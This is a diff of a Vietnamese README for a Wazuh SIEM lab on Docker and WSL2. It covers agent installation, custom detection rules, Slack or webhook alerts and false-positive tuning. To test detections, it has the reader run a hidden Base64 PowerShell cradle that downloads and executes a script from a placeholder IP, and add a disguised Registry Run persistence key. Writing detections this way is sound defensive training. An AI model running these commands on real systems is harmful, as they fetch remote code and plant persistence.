@@ -1,124 +1,175 @@
-# 🛡️ Security Operations Center (SOC Tier 1) Detection & Triage Lab
+# 🛡️ Wazuh SIEM & Agent Lab (Windows + Docker + WSL2)
 
-> Hệ thống lab giám sát an ninh mạng và phản ứng sự cố vận hành trên nền tảng **Docker Desktop (WSL2 Backend)** kết hợp **Wazuh Single-Node SIEM**. Hệ thống tối ưu hóa tài nguyên (tiêu thụ ~2GB - 2.5GB RAM), nạp trực tiếp dataset tấn công thực tế từ môi trường WSL2 qua thư mục mount `shared-logs/`, kiểm thử luật phát hiện theo thời gian thực và xử lý cảnh báo chuẩn SOC Tier 1.
+> Lab thực hành an ninh mạng: Triển khai cụm **Wazuh SIEM (Manager, Indexer, Dashboard)** chạy trên **Docker Desktop (WSL2 backend)** trên Windows. Cài đặt **Wazuh Agent** trên chính máy Windows để giám sát như môi trường Production. Sử dụng môi trường **WSL2** để bơm payload tấn công vào Agent, đọc dữ liệu sự kiện, tự thiết kế các luật cảnh báo (Custom Rules) và cấu hình gửi thông báo cảnh báo (Alert Notifications).
 
 ---
 
-## 📌 1. Kiến trúc Lab Tối ưu (WSL2 & Docker SIEM)
+## 📌 1. Kiến trúc Hệ thống
 
 ```
 [ Windows 10/11 Host ]
- ├── Trình duyệt Web (https://localhost) ◄── Xem Alert, Lọc KQL & Điều tra
- └── Môi trường Ubuntu WSL2 (~/My-SOC-Lab)
-      ├── Giới hạn RAM (.wslconfig)      ──► Khống chế trần 4GB RAM cho toàn bộ WSL2
-      ├── Datasets Tấn công Thật         ──► datasets/ (OpenSSH, OWASP, Sysmon)
-      ├── Script Bơm Log (feed_logs.sh)  ──► shared-logs/ ──(Mount)──► Container: wazuh.manager (/var/log/datasets/)
-      └── Tập Luật Phát hiện & Tuning    ──► rules/local_rules.xml ──► (/var/ossec/etc/rules/)
+ ├── 1. Wazuh SIEM Cluster (Docker Desktop / WSL2 Backend)
+ │    ├── wazuh.manager    (Port 1514: Nhận log agent, Port 1515: Đăng ký agent, Port 55000: API)
+ │    ├── wazuh.indexer    (Port 9200: OpenSearch, khống chế RAM 512MB)
+ │    └── wazuh.dashboard  (Port 443: Web UI quản trị và điều tra cảnh báo)
+ │
+ ├── 2. Wazuh Agent (Cài trực tiếp trên Windows)
+ │    └── Kết nối tới Wazuh Manager qua 127.0.0.1 (Port 1514, 1515)
+ │    └── Giám sát Windows Event Log, Sysmon, Command Execution, Registry
+ │
+ └── 3. Môi trường WSL2 (Ubuntu trên Windows)
+      ├── Tự bơm payload, quét cổng, bắn HTTP payload, kích hoạt lệnh kiểm thử
+      ├── Mount thư mục chia sẻ shared-logs/ để nạp thêm dataset khi cần
+      └── Tự thiết kế luật phát hiện trong rules/local_rules.xml
 ```
 
 ---
 
-## 📂 2. Cấu trúc Thư mục Dự án
+## 📂 2. Cấu trúc Thư mục
 
 ```plaintext
 My-SOC-Lab/
-├── .wslconfig                             # Tệp cấu hình giới hạn RAM/CPU cho WSL2
-├── README.md                              # Tài liệu kiến trúc & hướng dẫn vận hành
-├── PROJECT_PLAN.md                        # Kế hoạch chi tiết và tiến trình xây dựng hệ thống
-├── docker-compose.yml                     # Cụm Wazuh Single-Node (Indexer RAM 512m, mount logs & rules)
+├── .wslconfig                             # Giới hạn 4GB RAM cho WSL2 trên Windows
+├── README.md                              # Hướng dẫn dựng lab, cài agent, bơm payload và viết rule
+├── PROJECT_PLAN.md                        # Quy trình vận hành và kịch bản tấn công thực tế
+├── docker-compose.yml                     # Cụm Wazuh SIEM Single-Node tối ưu RAM
 ├── config/
-│   └── wazuh_manager.conf                 # Cấu hình <localfile> đọc log từ /var/log/datasets/
+│   └── wazuh_manager.conf                 # Cấu hình nguồn log và kênh thông báo (Slack/Webhook)
 ├── rules/
-│   └── local_rules.xml                    # Bộ luật phát hiện (Web SQLi, SSH Brute Force, Sysmon) & Tuning
-├── shared-logs/                           # Điểm mount trực tiếp giữa WSL2 và Wazuh Manager
+│   └── local_rules.xml                    # Nơi tự viết và tinh chỉnh luật phát hiện cảnh báo
+├── shared-logs/                           # Thư mục chứa log để nạp hoặc mount trực tiếp
 │   ├── web_access.log
 │   ├── linux_auth.log
 │   └── windows_sysmon.json
-├── datasets/                              # Dữ liệu tấn công thô chuẩn quốc tế
-│   ├── owasp_sqli.log                     # coreruleset & splunk/attack_data (T1190)
-│   ├── openssh_bruteforce.log             # logpai/loghub & splunk/attack_data (T1110.001)
-│   ├── windows_sysmon_execution.json      # OTRF/Security-Datasets (T1059.001)
-│   └── windows_sysmon_benign.json         # Log quản trị hợp lệ dùng kiểm thử False Positive
-├── scripts/
-│   ├── feed_logs.sh                       # Script bash bơm log từ datasets vào shared-logs
-│   └── triage_ioc_checker.py              # Script tra cứu IP/Hash qua AbuseIPDB và VirusTotal
-└── incident-reports/                      # 4 hồ sơ điều tra sự cố chuẩn SOC ITSM
-    ├── Case-01-OWASP-SQLi-and-WAF-Triage.md
-    ├── Case-02-SSH-BruteForce-ActiveResponse.md
-    ├── Case-03-Windows-Encoded-PowerShell-Persistence.md
-    └── Case-04-False-Positive-Alert-Tuning.md
+├── datasets/                              # Dữ liệu payload và log tấn công mẫu để kiểm thử
+│   ├── owasp_sqli.log
+│   ├── openssh_bruteforce.log
+│   ├── windows_sysmon_execution.json
+│   └── windows_sysmon_benign.json
+└── scripts/
+    ├── feed_logs.sh                       # Script bash bơm log mẫu từ WSL vào shared-logs
+    └── triage_ioc_checker.py              # Script Python tra cứu IP và Hash độc hại
 ```
 
 ---
 
-## ⚙️ 3. Thiết lập Hạ tầng & Tối ưu Tài nguyên
+## 🚀 3. Hướng dẫn Dựng Lab từ Đầu
 
-### Bước 1: Khống chế RAM trên Windows
-Sao chép tệp `.wslconfig` vào thư mục người dùng Windows (`%UserProfile%\.wslconfig`):
+### Bước 1: Khống chế RAM cho WSL2
+Copy tệp `.wslconfig` vào thư mục người dùng Windows (`%UserProfile%\.wslconfig`):
 ```ini
 [wsl2]
 memory=4GB
 processors=2
 swap=2GB
 ```
-Khởi động lại WSL trong PowerShell:
+Khởi động lại WSL qua PowerShell:
 ```cmd
 wsl --shutdown
 ```
 
-### Bước 2: Khởi động Wazuh SIEM
-Tại thư mục dự án trên WSL hoặc terminal Windows:
+### Bước 2: Bật Cụm Wazuh SIEM trên Docker
+Mở PowerShell hoặc terminal WSL tại thư mục dự án và chạy:
 ```bash
 docker compose up -d
 ```
-Mở trình duyệt truy cập: `https://localhost` (Tài khoản mặc định: `admin` / Mật khẩu: `SecretPassword123!`).
+Đợi khoảng 1-2 phút cho các container khởi động hoàn tất. Truy cập giao diện Web Dashboard:
+- Địa chỉ: `https://localhost`
+- Tài khoản: `admin`
+- Mật khẩu: `SecretPassword123!`
 
 ---
 
-## 🎯 4. Bơm Dữ liệu Tấn công & Bắt Cảnh báo (Live Testing)
+## 💻 4. Cài Đặt Wazuh Agent trên Windows (Production Mode)
 
-Dùng script `scripts/feed_logs.sh` để đẩy log từ `datasets/` vào `shared-logs/` với độ trễ (delay) thực tế:
+Tải bộ cài đặt chính thức của Wazuh Agent cho Windows (`.msi`) từ trang chủ Wazuh hoặc chạy qua PowerShell với quyền Administrator:
 
+```powershell
+Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.2-1.msi -OutFile wazuh-agent.msi
+msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER='127.0.0.1' WAZUH_REGISTRATION_SERVER='127.0.0.1' WAZUH_AGENT_NAME='WIN-ENDPOINT'
+NET START WazuhSvc
+```
+
+Sau khi dịch vụ khởi động, vào giao diện Wazuh Dashboard mục **Agents**, trạm làm việc Windows sẽ hiển thị trạng thái **Active**.
+
+---
+
+## 🎯 5. Tự Thêm Payload từ WSL để Agent Ghi Nhận
+
+Từ cửa sổ dòng lệnh WSL, thực hiện các hành động kích hoạt sự kiện để Windows Agent ghi log và gửi về Wazuh Manager:
+
+### 1. Kích hoạt lệnh PowerShell mã hóa (Base64) trên Windows từ WSL:
 ```bash
-# 1. Bơm tấn công Web SQL Injection (ModSecurity WAF & Nginx)
+powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==
+```
+
+### 2. Kích hoạt hành vi cài cắm khóa tự khởi động (Persistence) trên Windows:
+```bash
+powershell.exe -Command "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdateCheck /t REG_SZ /d C:\Users\Public\update.exe /f"
+```
+
+### 3. Bơm log tấn công Web hoặc SSH vào tệp giám sát:
+```bash
 bash scripts/feed_logs.sh web
-
-# 2. Bơm tấn công SSH Brute Force (kích hoạt rule frequency 5 lần / 60 giây)
 bash scripts/feed_logs.sh ssh
-
-# 3. Bơm lệnh PowerShell mã hóa Base64 & Sysmon Event ID 1
-bash scripts/feed_logs.sh sysmon
-
-# 4. Bơm tác vụ quản trị hợp lệ để kiểm thử bộ lọc False Positive
-bash scripts/feed_logs.sh benign
 ```
 
 ---
 
-## 🔍 5. Lọc Cảnh báo trên Wazuh Dashboard & Tinh chỉnh Luật
+## 🔧 6. Thiết Kế Luật Cảnh Báo (`rules/local_rules.xml`)
 
-### Lọc sự kiện trên giao diện (KQL Filters):
-- Lọc theo nhóm luật custom: `rule.groups: "custom_soc_lab"`
-- Lọc mức cảnh báo cao: `rule.level >= 10`
-- Lọc theo kỹ thuật MITRE: `rule.mitre.id: "T1190"` hoặc `rule.mitre.id: "T1110.001"`
+Chỉnh sửa tệp `rules/local_rules.xml` để tạo luật phát hiện theo nhu cầu.
 
-### Kiểm tra nhanh cấu trúc log bằng `wazuh-logtest`:
-```bash
-head -n 1 datasets/openssh_bruteforce.log | docker exec -i my-soc-lab-main-wazuh.manager-1 /var/ossec/bin/wazuh-logtest
-```
-
-### Áp dụng luật mới sau khi sửa `rules/local_rules.xml`:
+Mỗi lần chỉnh sửa xong, nạp lại cấu hình trong 2 giây mà không cần tắt container:
 ```bash
 docker exec my-soc-lab-main-wazuh.manager-1 /var/ossec/bin/wazuh-control restart
 ```
 
+Kiểm tra cú pháp và khả năng giải mã của log bằng công cụ `wazuh-logtest`:
+```bash
+docker exec -it my-soc-lab-main-wazuh.manager-1 /var/ossec/bin/wazuh-logtest
+```
+
 ---
 
-## 📊 6. Danh mục Kịch bản Điều tra (Use Cases)
+## 🔔 7. Cấu Hình Thông Báo Cảnh Báo (Alert Notifications)
 
-| Kịch bản | Bề mặt giám sát | Nguồn Dataset | Phân loại | Báo cáo chi tiết |
-| :--- | :--- | :--- | :---: | :--- |
-| **Case 01** | Web SQLi & WAF Action | `coreruleset` & `splunk/attack_data` | True Positive | [Case-01-Report](incident-reports/Case-01-OWASP-SQLi-and-WAF-Triage.md) |
-| **Case 02** | SSH Brute Force & Compromise | `logpai/loghub` & `splunk/attack_data` | True Positive | [Case-02-Report](incident-reports/Case-02-SSH-BruteForce-ActiveResponse.md) |
-| **Case 03** | Encoded PowerShell & Persistence | `OTRF/Security-Datasets` & Sysmon | True Positive | [Case-03-Report](incident-reports/Case-03-Windows-Encoded-PowerShell-Persistence.md) |
-| **Case 04** | False Positive & Rule Tuning | Windows 10 Task Scheduler Sysmon | False Positive | [Case-04-Report](incident-reports/Case-04-False-Positive-Alert-Tuning.md) |
+Trong tệp `config/wazuh_manager.conf`, cấu hình kênh nhận thông báo tự động khi nổ cảnh báo mức độ cao (Level >= 10):
+
+### Gửi thông báo qua Webhook / Slack:
+Điền URL webhook vào thẻ `<hook_url>`:
+```xml
+<integration>
+  <name>slack</name>
+  <hook_url>https://hooks.slack.com/services/YOUR_WEBHOOK_URL</hook_url>
+  <level>10</level>
+  <alert_format>json</alert_format>
+</integration>
+```
+
+### Gửi thông báo qua Custom Webhook (Telegram, Discord, Webhook.site):
+```xml
+<integration>
+  <name>custom-webhook</name>
+  <hook_url>https://webhook.site/YOUR_UUID</hook_url>
+  <level>10</level>
+  <alert_format>json</alert_format>
+</integration>
+```
+
+---
+
+## 🧹 8. Tinh Chỉnh và Lọc Cảnh Báo (Rule Tuning)
+
+Khi gặp cảnh báo giả (False Positive) từ các chương trình hợp lệ, thêm luật loại trừ vào `rules/local_rules.xml` với `level="0"`:
+
+```xml
+<rule id="100401" level="0">
+  <if_sid>100301</if_sid>
+  <field name="win.eventdata.user" type="pcre2">(?i)^DOMAIN\\svc_backup$</field>
+  <field name="win.eventdata.parentImage" type="pcre2">(?i)\\svchost\.exe$</field>
+  <field name="win.eventdata.commandLine" type="pcre2">(?i)Backup_Routine\.ps1</field>
+  <description>Tuning: Whitelist authorized IT Backup Service account</description>
+</rule>
+```
+Luật này giúp loại bỏ toàn bộ cảnh báo giả của tiến trình sao lưu định kỳ mà không làm ảnh hưởng đến việc bắt payload của kẻ tấn công thật.
